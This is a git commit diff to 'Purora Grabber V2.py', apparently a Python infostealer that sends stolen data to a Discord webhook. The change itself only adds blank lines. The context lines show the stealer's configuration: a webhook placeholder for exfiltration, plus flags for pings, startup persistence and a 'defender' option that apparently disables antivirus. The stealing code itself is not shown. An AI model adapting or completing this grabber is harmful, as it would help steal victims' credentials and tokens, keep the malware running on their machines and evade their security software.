84d159787969af0b6ca6acff9a67e874e3827892
Purora <117518751+Purora@users.noreply.github.com>
2022-11-13 15:30:17 +0100

    Update Purora Grabber V2.py

--- Purora Grabber V2.py
+++ Purora Grabber V2.py
@@ -21,12 +21,16 @@ from sys import argv
 from tempfile import gettempdir, mkdtemp
 from zipfile import ZIP_DEFLATED, ZipFile
 
+
+
 __WEBHOOK_HERE__ = "YOUR WEBHOOK HERE"
 __PING__ = "%ping_enabled%"
 __PINGTYPE__ = "%ping_type%"
 __ERROR__ = "%_error_enabled%"
 __STARTUP__ = "%_startup_enabled%"
 __DEFENDER__ = "%_defender_enabled%"
+
+
 
 def main(webhook: str):
     webhook = SyncWebhook.from_url(webhook, session=requests.Session())
